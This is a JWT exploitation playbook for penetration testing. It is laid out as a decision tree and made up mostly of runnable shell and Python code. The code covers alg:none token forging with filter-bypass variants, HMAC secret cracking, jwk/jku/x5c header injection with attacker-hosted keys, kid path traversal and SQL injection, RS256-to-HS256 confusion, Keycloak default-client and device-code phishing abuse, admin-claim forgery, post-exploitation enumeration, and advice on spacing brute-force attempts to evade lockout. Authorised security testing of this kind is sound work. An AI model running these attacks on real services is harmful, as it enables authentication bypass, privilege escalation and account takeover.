# JWT Attack Techniques

Comprehensive JWT exploitation reference for Phase 6.8 (Token/Session Attacks). Organized as a decision tree based on what you have and what you're targeting.

**Source:** PortSwigger Web Security Academy + real engagement experience (BFI Finance, Bank Jago).

---

## Decision Tree: Where to Start

```
┌─────────────────────────────────────────────────────────┐
│ What do you have?                                       │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ A) Valid signed JWT (from heapdump, JS, proxy, login)   │
│    → Go to: Section 1 (Signature Bypass)                │
│    → Go to: Section 2 (Key Brute-Force)                 │
│    → Go to: Section 3 (Header Injection)                │
│                                                         │
│ B) No token, but know the auth endpoint                 │
│    → Go to: Section 5 (Algorithm Enumeration)           │
│    → Go to: Section 6 (Token Endpoint Abuse)            │
│                                                         │
│ C) Have the server's public key (from JWKS endpoint)    │
│    → Go to: Section 4 (Algorithm Confusion)             │
│    → Go to: Section 3.1 (jwk injection)                 │
│                                                         │
│ D) Have a weak/leaked secret key                        │
│    → Go to: Section 7 (Token Forgery)                   │
└─────────────────────────────────────────────────────────┘
```

---

## Section 1: Signature Bypass (No Key Needed)

### 1.1 Unverified Signature (decode vs verify confusion)

Some applications call `jwt.decode()` instead of `jwt.verify()`. The signature is ignored entirely.

**Test:**
```bash
# Take a valid JWT, modify the payload (change username/role), keep original signature
HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64url)
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":1516239022}' | base64url)
# Keep the ORIGINAL signature from the valid token
FORGED="${HEADER}.${PAYLOAD}.${ORIGINAL_SIG}"
curl -sk -H "Authorization: Bearer $FORGED" "$TARGET"
```

**Indicator:** If the server accepts a token with modified payload but original signature → signature not verified.

### 1.2 Algorithm None (CVE-2015-9235)

Set `alg` to `none` and remove the signature (keep trailing dot).

**Test:**
```bash
# Variants to bypass string filtering
for alg in "none" "None" "NONE" "nOnE" "n0ne"; do
  HEADER=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 | tr -d '=' | tr '+/' '-_')
  PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')
  TOKEN="${HEADER}.${PAYLOAD}."  # Empty signature, trailing dot required
  echo "Testing alg=$alg:"
  curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET" -w " [%{http_code}]\n"
done
```

**Bypass filters:** Mixed case (`None`, `NONE`, `nOnE`), whitespace in JSON (`{ "alg" : "none" }`).

### 1.3 Empty Signature Acceptance

Some libraries accept tokens where the signature is present but empty or malformed.

**Test:**
```bash
# Valid header+payload, but signature is just "AA" (one null byte base64)
TOKEN="${HEADER}.${PAYLOAD}.AA"
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET"
```

---

## Section 2: Secret Key Brute-Force

### 2.1 HMAC Secret Brute-Force (hashcat)

Only works for symmetric algorithms (HS256, HS384, HS512).

```bash
# Requires a valid signed JWT from the target
JWT="eyJ..."

# Method 1: hashcat (fastest, GPU-accelerated)
hashcat -a 0 -m 16500 "$JWT" /opt/homebrew/share/seclists/Passwords/scraped-JWT-secrets.txt
# Re-run with --show to see results

# Method 2: jwt_tool
jwt_tool "$JWT" -C -d /opt/homebrew/share/seclists/Passwords/scraped-JWT-secrets.txt

# Method 3: Custom Python (when you need specific wordlists)
python3 << 'EOF'
import hmac, hashlib, base64, sys

jwt = "eyJ..."  # Your JWT here
header_payload = ".".join(jwt.split(".")[:2])
original_sig = jwt.split(".")[2]

with open("/opt/homebrew/share/seclists/Passwords/scraped-JWT-secrets.txt") as f:
    for secret in f:
        secret = secret.strip()
        sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
        ).rstrip(b'=').decode()
        if sig == original_sig:
            print(f"[+] SECRET FOUND: {secret}")
            sys.exit(0)
print("[-] Secret not found in wordlist")
EOF
```

**Wordlists (priority order):**
1. `/opt/homebrew/share/seclists/Passwords/scraped-JWT-secrets.txt` (104K entries)
2. Common defaults: `secret`, `password`, `123456`, `changeme`, `your-256-bit-secret`
3. Application-specific: company name, product name, `{app}-secret`, `{app}-jwt-key`

### 2.2 Character-by-Character Brute-Force

For extremely weak secrets (< 6 chars). Use hashcat with mask attack:

```bash
# Try all 1-6 character secrets
hashcat -a 3 -m 16500 "$JWT" ?a?a?a?a?a?a --increment
```

---

## Section 3: Header Parameter Injection

### 3.1 `jwk` Header Injection (Embedded Key)

Embed your own public key in the JWT header. If the server trusts embedded keys without whitelist validation, it will verify against YOUR key.

**Procedure:**
```bash
# 1. Generate RSA key pair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# 2. Extract key components for JWK
python3 << 'EOF'
import json, base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Generate key
key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
pub = key.public_key()
pub_numbers = pub.public_numbers()

def b64url(n, length):
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()

jwk = {
    "kty": "RSA",
    "kid": "attacker-key-1",
    "use": "sig",
    "n": b64url(pub_numbers.n, 256),
    "e": b64url(pub_numbers.e, 3)
}

header = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attacker-key-1",
    "jwk": jwk
}

payload = {"sub": "admin", "role": "admin", "iat": 1516239022}

# Sign with attacker's private key
import jwt as pyjwt
token = pyjwt.encode(payload, key, algorithm="RS256", headers={"kid": "attacker-key-1", "jwk": jwk})
print(f"Forged token: {token}")
EOF
```

**When it works:** Server uses the `jwk` from the header to verify instead of its own stored keys. Common in misconfigured implementations that don't maintain a key whitelist.

### 3.2 `jku` Header Injection (Remote Key URL)

Point the server to fetch verification keys from your controlled URL.

**Procedure:**
```bash
# 1. Generate key pair and create JWKS
# 2. Host JWKS on attacker server (webhook.site or ngrok)
cat > jwks.json << 'EOF'
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key-1",
    "use": "sig",
    "n": "<your-public-key-n>",
    "e": "AQAB"
  }]
}
EOF

# 3. Craft JWT with jku pointing to your server
HEADER='{"alg":"RS256","typ":"JWT","kid":"attacker-key-1","jku":"https://attacker.com/.well-known/jwks.json"}'

# 4. Sign with your private key
# 5. Send to target
```

**Bypass URL filtering:**
- `https://target.com@attacker.com/jwks.json` (URL parsing confusion)
- `https://target.com/.well-known/jwks.json#@attacker.com` (fragment)
- `https://attacker.com/target.com/jwks.json` (path confusion)
- Open redirect on target: `https://target.com/redirect?url=https://attacker.com/jwks.json`
- SSRF via `jku` to internal endpoints

### 3.3 `kid` Parameter Path Traversal

The `kid` parameter identifies which key to use. If it's used as a file path:

```bash
# Sign with empty string as secret (contents of /dev/null)
python3 << 'EOF'
import jwt, base64

# /dev/null = empty file = empty string as key
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    "",  # Empty string = contents of /dev/null
    algorithm="HS256",
    headers={"kid": "../../../../../../dev/null"}
)
print(token)
EOF
```

**Other `kid` traversal targets:**
- `/dev/null` → empty string (most common)
- `/proc/sys/kernel/hostname` → predictable content
- Known static files with predictable content
- CSS/JS files served by the application (content is public)

### 3.4 `kid` SQL Injection

If `kid` is used in a database query:

```bash
# Test for SQLi in kid parameter
# If the query is: SELECT key FROM keys WHERE kid = '{kid}'
HEADER='{"alg":"HS256","typ":"JWT","kid":"1 UNION SELECT '\''attacker-secret'\'' -- "}'
# Sign with 'attacker-secret' as the key
```

**Indicators:**
- Different error messages for valid vs invalid `kid` values
- Time-based: `kid: "1; SELECT SLEEP(5)--"`
- Boolean: `kid: "1 OR 1=1--"` vs `kid: "1 OR 1=2--"`

### 3.5 `x5c` Certificate Chain Injection

Embed a self-signed X.509 certificate in the header:

```bash
# 1. Generate self-signed cert
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -days 365 -subj "/CN=attacker"

# 2. Base64 encode the cert (DER format)
openssl x509 -in attacker.crt -outform DER | base64 | tr -d '\n'

# 3. Include in JWT header as x5c array
# Sign with attacker.key
```

---

## Section 4: Algorithm Confusion (RS256 → HS256)

When the server uses RS256 (asymmetric) but also accepts HS256 (symmetric), you can sign with the PUBLIC key as the HMAC secret.

**Prerequisites:** You need the server's public key (from JWKS endpoint, certificate, or `x5c` header).

**Procedure:**
```bash
# 1. Get the server's public key
curl -sk "$TARGET/.well-known/jwks.json" | jq '.keys[0]'
# Or extract from x5c in a captured JWT
# Or from the TLS certificate of the server

# 2. Convert JWK to PEM format
python3 << 'EOF'
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt, json

# Load public key PEM
with open("server_pub.pem", "rb") as f:
    pub_key_pem = f.read()

# Sign with HS256 using the public key as the HMAC secret
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    pub_key_pem,
    algorithm="HS256"
)
print(token)
EOF
```

**Why it works:** Server's verify logic:
1. Reads `alg` from header → sees `HS256`
2. Uses "the key" to verify HMAC → uses the public key (which it has stored)
3. Signature matches because you signed with the same public key

**Mitigated by:** Libraries that enforce algorithm whitelist per key type.

---

## Section 5: Algorithm Enumeration (No Token Available)

When you find a JWT-protected endpoint but don't have a valid token:

```python
import base64, json, requests

TARGET = "https://target.com/api/protected"
algorithms = [
    'HS256','HS384','HS512',
    'RS256','RS384','RS512',
    'ES256','ES384','ES512',
    'PS256','PS384','PS512',
    'EdDSA','none'
]

results = {}
for alg in algorithms:
    header = base64.urlsafe_b64encode(
        json.dumps({'alg': alg, 'typ': 'JWT'}, separators=(',',':')).encode()
    ).rstrip(b'=').decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({'sub': 'test', 'iat': 1516239022}, separators=(',',':')).encode()
    ).rstrip(b'=').decode()
    
    if alg == 'none':
        token = f"{header}.{payload}."
    else:
        token = f"{header}.{payload}.invalidsignature"
    
    r = requests.get(TARGET, headers={"Authorization": f"Bearer {token}"}, verify=False)
    results[alg] = {'status': r.status_code, 'body': r.text[:200]}
    print(f"  {alg}: {r.status_code} — {r.text[:100]}")

# Analyze error message differences
```

**Error message interpretation:**
| Response | Meaning | Next Step |
|----------|---------|-----------|
| "Signature verification failed" | Algorithm ACCEPTED, signature wrong | Brute-force secret (HMAC) or get public key (RSA) |
| "Algorithm not allowed" | Recognized but policy-blocked | Try other algorithms |
| "Algorithm not supported" | Library doesn't implement it | Skip |
| "Token expired" | Algorithm accepted AND verified (unlikely with fake sig) | Token format is correct |
| "Invalid token" / "Malformed" | Token structure rejected | Check format |
| Same error for all algorithms | Server doesn't differentiate | Blind testing needed |

---

## Section 6: Token Endpoint Abuse (Keycloak/OAuth2)

### 6.1 Public Client Token Grant

```bash
# Keycloak default public clients
for client in admin-cli account account-console; do
  echo "=== $client ==="
  curl -sk -X POST "$KEYCLOAK/protocol/openid-connect/token" \
    -d "grant_type=password&client_id=$client&username=admin&password=admin"
done
```

**Error interpretation:**
- "Invalid user credentials" → client works, user/pass wrong (password spray target)
- "Public client not allowed to retrieve service account" → public client confirmed, use password grant
- "Invalid client or Invalid client credentials" → client doesn't exist or is confidential

### 6.2 Client Credentials with Leaked Secret

```bash
# If you found a client_secret (heapdump, JS, env)
curl -sk -X POST "$KEYCLOAK/protocol/openid-connect/token" \
  -d "grant_type=client_credentials&client_id=$CLIENT&client_secret=$SECRET"
```

### 6.3 Device Code / CIBA Grant

```bash
# Device code flow (if supported) — can be used for phishing
curl -sk -X POST "$KEYCLOAK/protocol/openid-connect/auth/device" \
  -d "client_id=admin-cli"
# Returns user_code + device_code + verification_uri
# Victim visits verification_uri and enters user_code → attacker gets token
```

---

## Section 7: Token Forgery (With Known Secret)

Once you have the signing secret/key:

```python
import jwt

# HMAC (HS256/384/512)
token = jwt.encode(
    {"sub": "admin", "role": "admin", "iat": 1516239022, "exp": 9999999999},
    "discovered-secret",
    algorithm="HS256"
)

# RSA (RS256) — need private key
with open("private.pem") as f:
    private_key = f.read()
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    private_key,
    algorithm="RS256",
    headers={"kid": "server-key-id"}  # Match the server's expected kid
)

print(f"Authorization: Bearer {token}")
```

**Claims to modify for escalation:**
- `sub` → target user ID/username
- `role` / `roles` → `admin`, `realm-admin`
- `scope` → add `openid profile email admin`
- `aud` → match expected audience
- `groups` → add admin groups
- `realm_access.roles` → Keycloak-specific role escalation

---

## Section 8: Post-Exploitation with Forged Token

Once you have a valid forged/stolen token:

```bash
# 1. Enumerate accessible services
for svc in /api/v1/users /api/v1/admin /actuator /swagger-ui.html; do
  curl -sk -H "Authorization: Bearer $TOKEN" "${TARGET}${svc}" -w " [%{http_code}]\n" -o /dev/null
done

# 2. Check token permissions
curl -sk -H "Authorization: Bearer $TOKEN" "$KEYCLOAK/protocol/openid-connect/userinfo"

# 3. Try admin operations
curl -sk -H "Authorization: Bearer $TOKEN" "$KEYCLOAK/admin/realms" 

# 4. Token introspection (reveals all claims and permissions)
curl -sk -X POST "$KEYCLOAK/protocol/openid-connect/token/introspect" \
  -d "token=$TOKEN&client_id=admin-cli"
```

---

## Tools

| Tool | Use Case | Install |
|------|----------|---------|
| hashcat | HMAC secret brute-force (GPU) | `brew install hashcat` |
| jwt_tool | All-in-one JWT testing | `pip3 install jwt_tool` / GitHub |
| jwt-cracker | Character-by-character brute-force | `npm install jwt-cracker` |
| python-jwt | Programmatic token crafting | `pip3 install PyJWT cryptography` |
| Burp JWT Editor | Interactive JWT manipulation | BApp Store |
| jwt.io | Quick decode/inspect (DO NOT paste prod tokens) | Web |

---

## Pitfalls

- **Don't paste production JWTs into jwt.io** — it's a third-party site. Use `echo "$JWT" | cut -d. -f2 | base64 -d | jq .` locally.
- **PyJWT vs python-jose vs authlib** — different libraries have different APIs. PyJWT: `jwt.encode()`/`jwt.decode()`. python-jose: `jose.jwt.encode()`/`jose.jwt.decode()`.
- **base64url vs base64** — JWT uses base64url (no padding, `-_` instead of `+/`). Use `tr '+/' '-_' | tr -d '='` for manual encoding.
- **Clock skew** — if `exp` is checked, set it far in the future (9999999999). Some servers have 5-minute leeway.
- **`kid` must match** — when forging tokens, ensure the `kid` in your header matches what the server expects (check JWKS endpoint or captured tokens).
- **Keycloak realm-specific keys** — each realm has its own signing key. A token from realm A won't verify against realm B's key.
- **Algorithm confusion requires the exact public key format** — PEM with or without newlines, with or without headers. Try both `\n` and literal newlines.
- **Rate limiting on token endpoints** — Keycloak default: 30 failed attempts before lockout. Space out brute-force attempts.

---

## Checklist (Phase 6.8 Integration)

```markdown
| # | Technique | Status | Notes |
|---|-----------|--------|-------|
| 6.8.1 | Algorithm enumeration (error message analysis) | PENDING | |
| 6.8.2 | alg:none bypass (with case variations) | PENDING | |
| 6.8.3 | HMAC secret brute-force (hashcat + scraped-JWT-secrets.txt) | PENDING | |
| 6.8.4 | jwk header injection (embedded attacker key) | PENDING | |
| 6.8.5 | jku header injection (remote JWKS URL) | PENDING | |
| 6.8.6 | kid path traversal (/dev/null, known files) | PENDING | |
| 6.8.7 | kid SQL injection | PENDING | |
| 6.8.8 | Algorithm confusion (RS256→HS256 with public key) | PENDING | |
| 6.8.9 | x5c certificate chain injection | PENDING | |
| 6.8.10 | Expired token acceptance | PENDING | |
| 6.8.11 | Audience/issuer bypass (wrong aud/iss accepted) | PENDING | |
| 6.8.12 | Token endpoint abuse (public client, device code) | PENDING | |
```

**Priority order for time-constrained testing:**
1. 6.8.1 (enumeration — informs all other tests)
2. 6.8.2 (alg:none — instant win if it works)
3. 6.8.3 (brute-force — runs in background while you do other tests)
4. 6.8.8 (algorithm confusion — if you have the public key)
5. 6.8.4 (jwk injection — common misconfiguration)
6. 6.8.6 (kid traversal — if backend is Linux)
7. Rest as time permits
